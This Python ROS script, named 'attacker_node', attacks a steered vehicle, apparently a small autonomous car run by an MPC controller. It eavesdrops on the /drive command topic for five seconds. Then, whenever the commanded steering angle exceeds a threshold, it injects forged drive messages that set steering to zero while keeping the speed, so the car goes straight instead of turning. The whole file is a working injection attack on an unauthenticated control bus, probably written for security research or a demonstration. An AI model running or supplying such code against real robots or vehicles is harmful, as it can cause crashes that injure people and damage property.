#!/usr/bin/env python
# -*- coding: utf-8 -*-

import rospy
import time
from ackermann_msgs.msg import AckermannDriveStamped

class AttackerNode(object):

    TURN_INTERCEPT_THRESH = 0.25

    def __init__(self):
        rospy.init_node('attacker_node', anonymous=True)

        self.pub             = rospy.Publisher(
            '/drive', AckermannDriveStamped, queue_size=1)
        self.eavesdrop_count = 0

        rospy.logwarn("=" * 50)
        rospy.logwarn("ATTACKER NODE STARTED")
        rospy.logwarn("Phase 1: Eavesdropping for 5 seconds...")
        rospy.logwarn("=" * 50)

        self.sub = rospy.Subscriber(
            '/drive', AckermannDriveStamped,
            self._eavesdrop_cb, queue_size=1)

        time.sleep(5.0)
        self.sub.unregister()

        rospy.logwarn("Eavesdropped %d commands.", self.eavesdrop_count)
        rospy.logwarn("=" * 50)
        rospy.logwarn("Phase 2: ATTACK ACTIVE — suppressing turns")
        rospy.logwarn("=" * 50)

        rospy.Subscriber(
            '/drive', AckermannDriveStamped,
            self._attack_cb, queue_size=1)

        rospy.spin()

    def _eavesdrop_cb(self, msg):
        self.eavesdrop_count += 1
        if self.eavesdrop_count % 20 == 0:
            rospy.logwarn("[EAVESDROP] steer=%.3f  speed=%.2f",
                          msg.drive.steering_angle,
                          msg.drive.speed)

    def _attack_cb(self, msg):
        mpc_steer = msg.drive.steering_angle
        mpc_speed = msg.drive.speed

        if abs(mpc_steer) > self.TURN_INTERCEPT_THRESH:
            fake = AckermannDriveStamped()
            fake.header.stamp         = rospy.Time.now()
            fake.header.frame_id      = 'base_link'
            fake.drive.steering_angle = 0.0
            fake.drive.speed          = mpc_speed
            self.pub.publish(fake)
            rospy.logwarn("[ATTACK] Turn suppressed — "
                          "MPC=%.3f  injected=0.0", mpc_steer)


if __name__ == '__main__':
    try:
        AttackerNode()
    except rospy.ROSInterruptException:
        pass

